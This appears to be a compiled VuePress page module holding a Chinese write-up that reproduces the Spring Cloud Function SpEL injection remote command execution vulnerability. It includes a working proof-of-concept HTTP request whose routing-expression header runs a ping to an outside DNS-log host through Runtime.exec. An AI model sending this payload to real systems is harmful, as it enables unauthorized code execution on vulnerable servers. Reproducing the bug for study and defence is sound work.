import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o,c as r,a as e,b as c,d as s,e as n}from"./app-58e4a7d6.js";const d={},l=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Spring Cloud Function 是基于 Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于 Spring Cloud Function 中 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成了 Spel 表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Spring Cloud Function
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,5),u={href:"https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo",target:"_blank",rel:"noopener noreferrer"},p=n(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>搭建后访问</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191602220.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送 POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /functionRouter HTTP/1.1
Host: 192.168.1.27:9000
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;ping -c 1 dxytoy.dnslog.cn&quot;)
Content-Length: 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接收到请求</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191602216.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7);function g(h,m){const i=t("ExternalLinkIcon");return o(),r("div",null,[l,e("ul",null,[e("li",null,[e("a",u,[c("https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo"),s(i)])])]),p])}const b=a(d,[["render",g],["__file","Spring Cloud Function SPEL 远程命令执行漏洞.html.vue"]]);export{b as default};
